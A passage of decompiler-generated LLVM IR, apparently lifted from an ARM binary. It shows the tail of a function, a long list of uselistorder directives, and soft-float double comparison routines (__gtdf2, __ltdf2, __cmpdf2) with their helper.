  %v1_1aa24 = add i32 %v0_1aa24, -1
  store i32 %v1_1aa24, i32* @r4, align 4
  %v3_1aa24 = sub i32 0, %v0_1aa24
  %v4_1aa24 = and i32 %v0_1aa24, %v3_1aa24
  %v5_1aa24 = icmp slt i32 %v4_1aa24, 0
  store i1 %v5_1aa24, i1* @cpsr_v, align 1
  %v6_1aa24 = icmp slt i32 %v1_1aa24, 0
  store i1 %v6_1aa24, i1* @cpsr_n, align 1
  %v7_1aa24 = icmp eq i32 %v0_1aa24, 1
  store i1 %v7_1aa24, i1* @cpsr_z, align 1
  %v0_1aa28 = call i32 @function_1a6f4()
  store i32 %v0_1aa28, i32* @r0, align 4
  %v0_1aa30 = call i32 @function_1a6f4()
  store i32 %v0_1aa30, i32* @r0, align 4
  %v0_1aa34.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1aa38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1aa34

dec_label_pc_1aa34:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1aa34.pre-phi = phi i32 [ %v5_1a8a8, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1a8a8, %bb91 ], [ %v5_1a8a8, %.thread ]
  %v0_1aa38 = phi i32 [ %v5_1a8a4, %.thread1 ], [ %v5_1a8a4, %.thread2 ], [ %v5_1a8a4, %bb91 ], [ %v0_1aa38.pre, %.thread ]
  %v2_1aa3c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1aa34.pre, %.thread ]
  %v5_1aa34 = and i32 %v2_1aa3c, %v4_1aa34.pre-phi
  store i32 %v5_1aa34, i32* @r5, align 4
  %v4_1aa38 = icmp eq i32 %v2_1aa3c, %v0_1aa38
  br i1 %v4_1aa38, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1aa34
  %v5_1aa3c = icmp eq i32 %v5_1aa34, %v2_1aa3c
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1aa34, %bb109
  %v0_1aa40 = phi i1 [ false, %dec_label_pc_1aa34 ], [ %v5_1aa3c, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1aa40, i32 ptrtoint (i32* @global_var_1a888.698 to i32))
  %v0_1aa44 = load i32, i32* @r4, align 4
  %v1_1aa44 = load i32, i32* %ip.global-to-local, align 4
  %v4_1aa44 = icmp eq i32 %v1_1aa44, %v0_1aa44
  br i1 %v4_1aa44, label %dec_label_pc_1aa4c, label %dec_label_pc_1aa68

dec_label_pc_1aa4c:                               ; preds = %bb110
  %v0_1aa4c = load i32, i32* @r0, align 4
  %v1_1aa4c = load i32, i32* @r1, align 4
  %v4_1aa4c = mul i32 %v1_1aa4c, 4096
  %v5_1aa4c = or i32 %v4_1aa4c, %v0_1aa4c
  store i32 %v5_1aa4c, i32* %r4.global-to-local, align 4
  %v1_1aa50 = icmp ne i32 %v5_1aa4c, 0
  call void @__pseudo_cond_branch(i1 %v1_1aa50, i32 ptrtoint (i32* @global_var_1a888.698 to i32))
  %v0_1aa54 = load i32, i32* @r5, align 4
  %v1_1aa54 = load i32, i32* %ip.global-to-local, align 4
  %v1_1aa58 = icmp ne i32 %v1_1aa54, %v0_1aa54
  call void @__pseudo_cond_branch(i1 %v1_1aa58, i32 ptrtoint (i32* @global_var_1a86c.699 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1aa64 = call i32 @function_1a888(i32 %arg3, i32 %arg4)
  store i32 %v2_1aa64, i32* @r0, align 4
  %v1_1aa68.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1aa68

dec_label_pc_1aa68:                               ; preds = %bb110, %dec_label_pc_1aa4c
  %v1_1aa68 = phi i32 [ %v1_1aa44, %bb110 ], [ %v1_1aa68.pre, %dec_label_pc_1aa4c ]
  %v0_1aa68 = load i32, i32* @r5, align 4
  %v4_1aa68 = icmp eq i32 %v0_1aa68, %v1_1aa68
  br i1 %v4_1aa68, label %dec_label_pc_1aa70, label %dec_label_pc_1aa68.dec_label_pc_1aa84_crit_edge

dec_label_pc_1aa68.dec_label_pc_1aa84_crit_edge:  ; preds = %dec_label_pc_1aa68
  %v0_1aa84.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1aa84

dec_label_pc_1aa70:                               ; preds = %dec_label_pc_1aa68
  %v4_1aa70 = mul i32 %arg4, 4096
  %v5_1aa70 = or i32 %v4_1aa70, %arg3
  store i32 %v5_1aa70, i32* %r5.global-to-local, align 4
  %v7_1aa70 = icmp eq i32 %v5_1aa70, 0
  call void @__pseudo_cond_branch(i1 %v7_1aa70, i32 ptrtoint (i32* @global_var_1a81c.700 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1aa80 = call i32 @function_1a888(i32 %arg3, i32 %arg4)
  store i32 %v2_1aa80, i32* @r0, align 4
  br label %dec_label_pc_1aa84

dec_label_pc_1aa84:                               ; preds = %dec_label_pc_1aa68.dec_label_pc_1aa84_crit_edge, %dec_label_pc_1aa70
  %v0_1aa84 = phi i32 [ %v0_1aa84.pre, %dec_label_pc_1aa68.dec_label_pc_1aa84_crit_edge ], [ %v2_1aa80, %dec_label_pc_1aa70 ]
  %v1_1aa84 = load i32, i32* @r1, align 4
  %v3_1aa84 = mul i32 %v1_1aa84, 2
  %v4_1aa84 = or i32 %v3_1aa84, %v0_1aa84
  store i32 %v4_1aa84, i32* %r6.global-to-local, align 4
  %v6_1aa84 = icmp eq i32 %v4_1aa84, 0
  br i1 %v6_1aa84, label %dec_label_pc_1aa84._crit_edge, label %bb111

dec_label_pc_1aa84._crit_edge:                    ; preds = %dec_label_pc_1aa84
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1aa84
  %v4_1aa88 = mul i32 %arg4, 2
  %v5_1aa88 = or i32 %v4_1aa88, %arg3
  store i32 %v5_1aa88, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1aa88, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1aa84._crit_edge, %bb111
  %v4_1aa98.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1aa84._crit_edge ], [ %v5_1aa88, %bb111 ]
  %v0_1aa8c = phi i1 [ false, %dec_label_pc_1aa84._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1aa8c, i32 ptrtoint (i32* @global_var_1a7b4.701 to i32))
  %v0_1aa90 = load i32, i32* @r0, align 4
  %v1_1aa90 = load i32, i32* @r1, align 4
  %v3_1aa90 = mul i32 %v1_1aa90, 2
  %v4_1aa90 = or i32 %v3_1aa90, %v0_1aa90
  store i32 %v4_1aa90, i32* %r4.global-to-local, align 4
  %v1_1aa94 = icmp ne i32 %v4_1aa90, 0
  call void @__pseudo_cond_branch(i1 %v1_1aa94, i32 ptrtoint (i32* @global_var_1a86c.699 to i32))
  store i32 %v4_1aa98.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1aa9c = icmp ne i32 %v4_1aa98.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1aa9c, i32 ptrtoint (i32* @global_var_1a81c.700 to i32))
  %v0_1aaa0 = load i32, i32* @r0, align 4
  %v1_1aaa0 = load i32, i32* @r1, align 4
  %v2_1aaa0 = call i32 @function_1a888(i32 %v0_1aaa0, i32 %v1_1aaa0)
  store i32 %v2_1aaa0, i32* %r0.global-to-local, align 4
  ret i32 %v2_1aaa0

; uselistorder directives
  uselistorder i32 %v5_1aa88, { 1, 0, 2 }
  uselistorder i32 %v1_1aa44, { 1, 0 }
  uselistorder i32 %v1_1aa24, { 1, 0 }
  uselistorder i32 %v0_1aa24, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1aa0c, { 2, 0, 1 }
  uselistorder i32 %v6_1aa08, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1aa00, { 1, 0 }
  uselistorder i32 %v2_1a9e8, { 1, 0, 2 }
  uselistorder i32 %v1_1a9e8, { 1, 0, 2 }
  uselistorder i32 %v1_1a9e4, { 1, 0, 2 }
  uselistorder i32 %v0_1a9e4, { 1, 0, 2 }
  uselistorder i1 %v7_1a9d8, { 1, 0 }
  uselistorder i32 %v2_1a9bc, { 1, 0 }
  uselistorder i32 %v3_1a9a8, { 2, 1, 0 }
  uselistorder i32 %v3_1a99c, { 0, 2, 1 }
  uselistorder i32 %v5_1a998, { 2, 0, 1 }
  uselistorder i32 %v6_1a988, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a974, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1a970, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1a97c, { 0, 2, 1 }
  uselistorder i32 %v1_1a988, { 1, 0 }
  uselistorder i32 %v6_1a96c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a958, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1a954, { 0, 2, 1 }
  uselistorder i32 %v0_1a960, { 0, 2, 1 }
  uselistorder i32 %v1_1a96c, { 1, 0 }
  uselistorder i32 %v6_1a950, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1a93c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a944, { 0, 2, 1 }
  uselistorder i32 %v1_1a950, { 1, 0 }
  uselistorder i32 %v3_1a934, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1a928, { 1, 2, 0 }
  uselistorder i32 %v3_1a9a813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1a9a417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1a928, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1a934, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1a9d0.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1a914, { 1, 0 }
  uselistorder i32 %v0_1a918, { 1, 0 }
  uselistorder i32 %v3_1a904, { 1, 0 }
  uselistorder i1 %v1_1a8f8, { 1, 0 }
  uselistorder i32 %v3_1a8e8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a8e4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1a8dc, { 2, 1, 0 }
  uselistorder i32 %v5_1a8d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1a8b8, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1a8a8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1a8a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1a8a4, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1a8a4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1a898, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 10 }
  uselistorder i32 (i32, i32)* @function_1a888, { 2, 1, 0 }
  uselistorder i32 ()* @function_1a6f4, { 1, 0 }
  uselistorder i32 1024, { 2, 0, 11, 12, 3, 13, 1, 14, 15, 16, 5, 9, 10, 4, 8, 7, 6, 17 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 9, 7, 8, 10, 11, 26, 12, 13, 2, 14, 15, 30, 132, 133, 140, 142, 16, 143, 17, 146, 147, 44, 148, 150, 167, 168, 169, 32, 31, 45, 170, 18, 171, 172, 155, 156, 110, 111, 46, 95, 96, 97, 98, 144, 145, 91, 92, 93, 94, 141, 3, 47, 173, 174, 175, 176, 38, 39, 40, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 157, 161, 162, 134, 48, 135, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 158, 41, 123, 136, 137, 49, 50, 138, 139, 99, 100, 51, 101, 52, 53, 54, 33, 149, 42, 102, 179, 103, 55, 56, 57, 58, 59, 60, 61, 62, 151, 152, 153, 154, 63, 181, 182, 0, 183, 184, 37, 64, 165, 28, 163, 164, 5, 4, 34, 65, 66, 67, 68, 69, 70, 124, 125, 126, 127, 128, 129, 86, 159, 160, 104, 71, 72, 166, 19, 73, 74, 20, 27, 21, 22, 6, 23, 24, 35, 75, 76, 105, 106, 107, 108, 77, 109, 78, 43, 87, 79, 130, 80, 88, 89, 81, 90, 131, 29, 36, 82, 177, 178, 83, 180, 25, 84, 85 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 65, 66, 33, 6, 7, 22, 8, 134, 135, 142, 144, 145, 146, 147, 9, 148, 150, 151, 152, 153, 154, 34, 76, 50, 51, 67, 163, 164, 165, 166, 29, 99, 77, 78, 79, 80, 149, 143, 181, 182, 187, 236, 42, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 167, 100, 101, 102, 103, 104, 105, 106, 107, 108, 10, 43, 109, 40, 110, 111, 68, 112, 113, 168, 169, 170, 136, 137, 138, 139, 140, 141, 81, 82, 83, 84, 52, 254, 255, 56, 35, 85, 11, 132, 184, 86, 87, 31, 188, 189, 190, 191, 192, 193, 194, 195, 12, 57, 196, 197, 198, 199, 200, 201, 202, 203, 13, 155, 156, 157, 158, 159, 160, 161, 162, 204, 205, 206, 207, 14, 208, 209, 15, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 227, 220, 221, 222, 223, 58, 24, 224, 225, 226, 59, 60, 16, 228, 229, 230, 231, 233, 234, 61, 17, 235, 18, 232, 176, 46, 47, 44, 45, 25, 26, 37, 38, 48, 256, 175, 171, 172, 114, 115, 69, 116, 117, 118, 119, 30, 120, 62, 63, 121, 122, 123, 49, 124, 125, 126, 127, 27, 28, 128, 129, 130, 64, 173, 174, 88, 177, 32, 178, 179, 180, 53, 70, 36, 19, 20, 23, 21, 89, 90, 91, 54, 92, 93, 94, 95, 55, 96, 97, 98, 71, 131, 72, 73, 74, 75, 41, 39, 133, 183, 185, 186 }
  uselistorder i32 4, { 5, 6, 187, 263, 264, 188, 7, 8, 268, 269, 270, 271, 272, 69, 273, 274, 282, 284, 285, 101, 286, 287, 288, 81, 289, 292, 126, 293, 294, 295, 296, 297, 298, 9, 299, 127, 102, 300, 128, 0, 1, 129, 303, 325, 326, 104, 103, 327, 130, 131, 132, 133, 328, 329, 106, 330, 105, 331, 83, 226, 227, 228, 316, 317, 202, 203, 290, 291, 197, 198, 199, 200, 201, 283, 10, 332, 11, 333, 340, 275, 12, 13, 14, 222, 15, 16, 229, 17, 100, 95, 96, 18, 399, 97, 400, 86, 19, 20, 98, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 21, 418, 419, 420, 421, 422, 423, 85, 424, 425, 426, 427, 428, 429, 22, 23, 99, 430, 319, 107, 230, 231, 232, 233, 234, 235, 236, 237, 238, 82, 239, 240, 241, 242, 243, 318, 244, 134, 276, 277, 278, 279, 280, 281, 24, 204, 205, 206, 207, 25, 208, 431, 135, 108, 136, 432, 26, 433, 137, 195, 196, 343, 344, 345, 90, 346, 138, 27, 209, 139, 210, 140, 87, 211, 265, 141, 266, 267, 335, 336, 337, 338, 142, 143, 212, 144, 145, 213, 28, 214, 215, 84, 88, 349, 350, 351, 352, 353, 354, 146, 147, 29, 355, 356, 357, 358, 359, 360, 361, 362, 148, 347, 348, 304, 305, 306, 307, 308, 309, 310, 311, 312, 30, 313, 314, 315, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 149, 150, 151, 377, 378, 381, 384, 379, 380, 109, 152, 382, 70, 383, 385, 386, 387, 389, 153, 32, 31, 388, 154, 155, 156, 341, 320, 398, 33, 34, 35, 36, 2, 245, 37, 38, 157, 71, 39, 40, 216, 158, 41, 159, 160, 161, 162, 246, 247, 42, 248, 163, 249, 250, 251, 111, 252, 253, 110, 164, 254, 255, 256, 257, 258, 259, 72, 165, 260, 262, 166, 167, 261, 189, 321, 43, 322, 112, 323, 324, 301, 302, 390, 391, 190, 44, 45, 46, 47, 73, 48, 49, 50, 74, 51, 52, 168, 53, 217, 113, 218, 219, 220, 221, 223, 91, 224, 92, 225, 54, 93, 94, 55, 191, 169, 75, 115, 192, 170, 171, 172, 173, 119, 174, 175, 117, 114, 193, 118, 56, 176, 116, 57, 194, 125, 58, 59, 89, 177, 120, 334, 178, 76, 77, 60, 61, 62, 122, 121, 123, 78, 179, 124, 63, 64, 79, 180, 339, 181, 80, 182, 183, 65, 342, 66, 67, 68, 392, 393, 394, 395, 396, 397, 184, 185, 186, 3, 4 }
  uselistorder i32 32, { 97, 98, 99, 100, 30, 31, 40, 84, 85, 33, 34, 101, 32, 41, 102, 103, 104, 105, 37, 106, 119, 121, 122, 83, 133, 48, 86, 134, 123, 124, 87, 88, 89, 90, 120, 135, 42, 35, 107, 49, 22, 108, 109, 50, 125, 126, 44, 43, 51, 52, 56, 53, 57, 54, 58, 55, 59, 60, 127, 128, 61, 69, 70, 68, 71, 72, 73, 74, 75, 76, 63, 64, 1, 65, 2, 66, 4, 3, 62, 67, 38, 77, 136, 6, 5, 8, 7, 10, 9, 36, 131, 129, 130, 110, 111, 21, 112, 0, 78, 113, 114, 115, 116, 117, 118, 23, 91, 92, 132, 137, 79, 93, 80, 39, 94, 95, 96, 12, 11, 24, 45, 81, 25, 14, 13, 16, 15, 26, 18, 17, 27, 28, 20, 19, 29, 46, 47, 82 }
  uselistorder i32 33, { 4, 5, 6, 3, 7, 8, 9, 0, 2, 1 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 88, 13, 14, 15, 16, 17, 18, 87, 99, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 92, 59, 93, 60, 94, 61, 95, 96, 62, 63, 65, 64, 66, 67, 68, 69, 0, 90, 1, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 86, 97, 80, 85, 91, 98, 84, 81, 89, 82, 83 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 75, 76, 77, 78, 126, 127, 4, 128, 129, 130, 131, 147, 148, 149, 150, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 189, 190, 191, 192, 193, 194, 195, 207, 208, 209, 221, 222, 223, 224, 6, 5, 33, 34, 35, 36, 37, 38, 225, 226, 7, 227, 228, 229, 230, 231, 232, 233, 151, 152, 153, 154, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 132, 8, 133, 134, 79, 80, 81, 82, 9, 83, 84, 85, 86, 87, 88, 89, 135, 136, 137, 138, 10, 11, 139, 140, 141, 142, 143, 144, 145, 146, 39, 40, 41, 42, 43, 44, 45, 46, 288, 12, 13, 14, 292, 293, 294, 295, 296, 297, 2, 298, 299, 25, 26, 28, 15, 29, 16, 30, 289, 290, 291, 47, 48, 49, 122, 123, 124, 125, 50, 51, 52, 53, 54, 55, 256, 260, 261, 262, 263, 257, 258, 259, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 264, 265, 266, 267, 268, 17, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 284, 286, 280, 281, 282, 283, 285, 287, 58, 59, 3, 60, 27, 251, 252, 253, 254, 255, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 18, 210, 211, 61, 19, 62, 63, 212, 20, 213, 214, 101, 21, 24, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 1, 117, 22, 31, 102, 0, 103, 104, 56, 57, 215, 216, 23, 217, 218, 219, 220, 118, 119, 120, 121, 180, 181, 182, 183, 184, 185, 186, 187, 188, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 248, 249, 250, 32 }
  uselistorder i32* @r5, { 126, 127, 128, 129, 130, 131, 132, 133, 134, 54, 55, 56, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 246, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 1, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 8, 287, 288, 289, 290, 291, 344, 299, 300, 301, 302, 303, 304, 305, 28, 306, 307, 308, 325, 361, 362, 9, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 10, 378, 377, 30, 379, 380, 381, 382, 383, 57, 58, 59, 60, 61, 62, 63, 384, 385, 386, 387, 388, 389, 394, 395, 390, 391, 392, 393, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 11, 157, 158, 64, 65, 66, 67, 68, 69, 70, 71, 72, 247, 248, 249, 250, 251, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 345, 346, 347, 348, 450, 451, 452, 224, 33, 225, 5, 226, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 326, 327, 31, 328, 227, 228, 229, 230, 159, 2, 160, 161, 162, 163, 164, 165, 231, 14, 232, 233, 12, 234, 235, 236, 237, 238, 239, 13, 240, 241, 242, 243, 244, 245, 73, 15, 74, 75, 76, 77, 34, 78, 16, 79, 80, 81, 82, 83, 465, 17, 466, 467, 477, 478, 43, 44, 45, 46, 47, 48, 49, 468, 469, 470, 471, 472, 84, 85, 86, 87, 88, 89, 90, 91, 92, 210, 211, 212, 93, 94, 95, 96, 18, 19, 473, 474, 475, 476, 97, 98, 99, 100, 418, 419, 423, 424, 425, 426, 427, 420, 421, 422, 309, 310, 311, 20, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 7, 441, 442, 443, 444, 445, 21, 446, 447, 448, 449, 105, 106, 107, 108, 109, 408, 409, 410, 411, 415, 416, 22, 417, 349, 23, 350, 351, 352, 166, 24, 167, 35, 168, 169, 170, 171, 172, 173, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 110, 111, 112, 113, 114, 339, 340, 341, 342, 343, 174, 175, 177, 176, 178, 179, 25, 180, 181, 182, 183, 184, 185, 186, 32, 187, 188, 192, 6, 193, 3, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 50, 51, 52, 189, 190, 191, 102, 101, 29, 103, 104, 353, 354, 355, 356, 357, 358, 26, 359, 360, 204, 205, 206, 207, 208, 209, 292, 293, 294, 295, 296, 27, 297, 298, 115, 116, 4, 0, 117, 118, 119, 120, 121, 122, 123, 124, 125, 36, 37, 38, 39, 40, 41, 42, 412, 413, 414, 53 }
  uselistorder i32 %arg4, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 7, 6, 4, 9, 8, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1aa84, { 1, 0 }
  uselistorder label %dec_label_pc_1aa68, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1aa34, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1a924, { 1, 0 }
  uselistorder label %dec_label_pc_1a90c, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1aaa8 = call i32 @function_1aab8()
  ret i32 %v0_1aaa8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1aab0 = call i32 @function_1aab8()
  ret i32 %v0_1aab0

; uselistorder directives
  uselistorder i32 ()* @function_1aab8, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1aab4 = load i32, i32* @r0, align 4
  ret i32 %v0_1aab4
}

define i32 @function_1aab8() local_unnamed_addr {
dec_label_pc_1aab8:
  %v0_1aab8 = load i32, i32* @ip, align 4
  %v0_1aabc = load i32, i32* @r1, align 4
  %v2_1aabc = mul i32 %v0_1aabc, 2
  %v2_1aabc.off = add i32 %v2_1aabc, 4194303
  %tmp = icmp ult i32 %v2_1aabc.off, 2097152
  %v0_1aac4 = load i32, i32* @r3, align 4
  %v2_1aac4 = mul i32 %v0_1aac4, 2
  br i1 %tmp, label %dec_label_pc_1ab14, label %bb

bb:                                               ; preds = %dec_label_pc_1aab8
  %v2_1aac4.off = add i32 %v2_1aac4, 4194303
  %tmp21 = icmp ult i32 %v2_1aac4.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1ab08, label %dec_label_pc_1aad0

dec_label_pc_1aad0:                               ; preds = %dec_label_pc_1ab1c, %dec_label_pc_1ab28, %bb
  %v0_1aad0 = load i32, i32* @r0, align 4
  %v4_1aad0 = or i32 %v0_1aad0, %v2_1aabc
  %v6_1aad0 = icmp eq i32 %v4_1aad0, 0
  br i1 %v6_1aad0, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1aad0
  %v1_1aad4 = load i32, i32* @r2, align 4
  %v5_1aad4 = or i32 %v1_1aad4, %v2_1aac4
  %v7_1aad4 = icmp eq i32 %v5_1aad4, 0
  br i1 %v7_1aad4, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1aad0, %bb10
  %v5_1aad8 = icmp eq i32 %v0_1aac4, %v0_1aabc
  br i1 %v5_1aad8, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1aadc.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1aadc = phi i32 [ %v2_1aadc.pre, %.thread..thread1_crit_edge ], [ %v1_1aad4, %bb10 ]
  %v5_1aadc = icmp eq i32 %v2_1aadc, %v0_1aad0
  br i1 %v5_1aadc, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1aae4 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1aae4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1aae4, i32 %v0_1aae4)
  %v0_1aae8 = load i32, i32* @r0, align 4
  %v0_1aaec = load i32, i32* @r1, align 4
  %v1_1aaec = load i32, i32* @r3, align 4
  %v2_1aaec = xor i32 %v1_1aaec, %v0_1aaec
  %v3_1aaec = icmp slt i32 %v2_1aaec, 0
  br i1 %v3_1aaec, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1aaf0 = icmp eq i32 %v0_1aaec, %v1_1aaec
  br i1 %v10_1aaf0, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1aaf4 = load i32, i32* @r2, align 4
  %v4_1aaf4 = icmp ult i32 %v0_1aae8, %v2_1aaf4
  br i1 %v4_1aaf4, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1aaf0 = icmp ult i32 %v0_1aaec, %v1_1aaec
  br i1 %v4_1aaf0, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1aaec, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1aaf8 = and i32 %v1_1aaec, 1073741824
  %v3_1aaf8 = icmp eq i32 %v2_1aaf8, 0
  %v4_1aaf8 = ashr i32 %v1_1aaec, 31
